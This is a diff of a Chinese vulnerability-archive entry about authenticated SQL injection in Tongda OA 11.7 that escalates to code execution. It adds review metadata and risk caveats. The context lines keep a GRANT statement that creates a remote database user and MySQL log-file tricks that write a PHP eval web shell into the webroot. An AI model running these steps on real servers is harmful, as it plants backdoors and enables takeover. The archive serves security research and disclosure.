@@ -1,10 +1,51 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "通达OA delete_cascade SQL 注入至日志写入"
+product: "通达OA"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "11.7"
+prerequisites: "登录；应用DB授权/日志及文件写权限"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/rtX9mJkPHd9njvM_PIrK_Q"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE%5B0day%5D.md"
+category_recommendation: "OA / 通达"
+id: "vw-72e4a740861bd65f53e11a15"
+entity_id: "ve-72e4a740861bd65f53e11a15"
+schema_version: "1"
 ---
 
-# 通达OA v11.7后台SQL注入到RCE[0day]
+# 通达OA delete_cascade SQL 注入至日志写入
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：通达OA；delete_cascade SQLi至日志写入
+- 版本、配置及部署条件：11.7
+- 认证与权限前提：登录；应用DB授权/日志及文件写权限
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 根因addslashes再撤销解释有价值，主要代码图未视检
+- SQL字符串被拆两个代码块，日志语句反引号压平，图片包在代码块内
+- password_expired=Y人为制造后续故障，应解释而非通用必经步骤
+- 0day历史题应标日期；账号授权和日志改变无回滚
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rtX9mJkPHd9njvM_PIrK_Q)
 
 > Author: AdminTony
@@ -109,10 +150,7 @@ grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@1
 `# 查路径：``select @@basedir; # c:\td0a117\mysql5\，那么web目录就是c:\td0a117\webroot\``# 方法1：``set global slow_query_log=on;``set global slow_query_log_file='C:/td0a117/webroot/tony.php';``select '<?php eval($_POST[x]);?>' or sleep(11);``# 方法2：``set global general_log = on;``set global general_log_file = 'C:/td0a117/webroot/tony2.php';``select '<?php eval($_POST[x]);?>';``show variables like '%general%';`
 ```
 
-```
-  
-
-```
+(原资料此处为空，未提供请求或代码。)
 
 ![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlPgxy3pXbnabGd29Knlf9KRZS0vp97htvbdSnG4gMKu1OcqM8aZgKcw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
 
